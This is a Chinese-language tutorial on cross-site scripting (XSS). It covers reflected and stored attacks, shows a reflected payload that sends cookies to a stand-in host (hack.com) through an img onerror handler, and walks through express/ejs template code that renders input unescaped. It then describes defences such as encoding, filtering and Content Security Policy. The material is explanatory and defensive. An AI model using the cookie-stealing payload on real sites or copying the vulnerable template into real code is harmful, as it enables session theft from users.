#### 1.什么是xss

xss就是跨站脚本攻击cross site scripting。为了不和层叠样式表css名称一样。缩写叫做xss。
恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的

#### 2.xss攻击的场景

1.反射型攻击

这类攻击方式主要借助URL来实施。URL的构成分为协议、域名、端口、路径、查询几部分构成。
XSS往往在“查询”部分发现漏洞构造攻击代码实施攻击，所谓“反射”可以理解为hacker并不会直接攻击客户，而是通过URL植入，用户点击url访问到服务器的数据，获得查询的html，植入到用户页面完成攻击。

https://www.toutiao.com/search?item=热点新闻
协议     域名             路径    查询

2.存储类攻击

存储型攻击方式和反射型最大的区别就是不通过URL来传播，而是利用站点本身合法的存储结构，比如评论。任何用户都可以通过站点提供的接口提交评论内容，这些评论内容都被存储到服务器的数据库。当用户访问这些评论的时候，服务器从数据库提取内容插入到页面反馈给用户。如果评论内容本身是具备攻击性内容，用户无一幸免。

#### 3.xss的工作原理

反射型和存储型xss的工作原理：
1.构造攻击代码
2.服务端提取js代码，当成文本处理，这些文本在服务器被整合到HTML文档中
3.浏览器解析，XSS执行

例子：

```
//反射型xss攻击
https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
服务端提取并写入HTML
我们以 Node.js 应用型框架express.js为例：
服务端代码(express.js)
router.get('/', function (req, res, next) {
    res.render('index', {
        title: 'Express',
        search: req.query.item
    });
});
//直接渲染到了html，这段代码的含义是告诉浏览器加载一张图片，图片的地址是空，根据加载机制空图片的加载会触发Element的onerror事件，这段代码的onerror事件是将本地cookie传到指定的网站。
ejs模板
<p>
    <%- search %>
</p>
这里列举了以反射型为主的服务端代码，通过获取URL的查询res.query.item,最后在模板中输出内容。对于存储型的区别是通过数据库拿到对应内容，模板部分一致。
```

#### 4.xss防范措施

1.编码和DOM Parse和过滤

对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。
从XSS工作的原理可知，在服务端进行编码，在模板解码这个过程对于富文本的内容来说，完全可以被浏览器解析到并执行，进而给了XSS执行的可乘之机。
为了杜绝悲剧发生，我们需要在浏览器解析之后进行解码，得到的文本进行DOM parse拿到DOM Tree，对所有的不安全因素进行过滤，最后将内容交给浏览器，达到避免XSS感染的效果。

2.规范的方法，比如加入doctype html等

3.使用csp(Content Security Policy )

内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，通过配置HTTP返回包header头Content-Security-Policy来实现。用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。

<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">

示例：
Content-Security-Policy: default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src 'self' blob: data: 'unsafe-inline' 'unsafe-eval' cdn.bootcss.com g.alicdn.com code.highcharts.com *.pstatp.com unpkg.com cdnjs.cloudflare.com ajax.googleapis.com *.snssdk.com; report-uri https://allsec.byted.org/csp/report

如果攻击者插入<script src='http://xxxx.com/x.js'></script>（或者以其他形式，插入了javascript文件）
导入了非白名单的远端javascript文件，浏览器就会给就会https://allsec.byted.org/csp/report发送一个http请求用作告警。
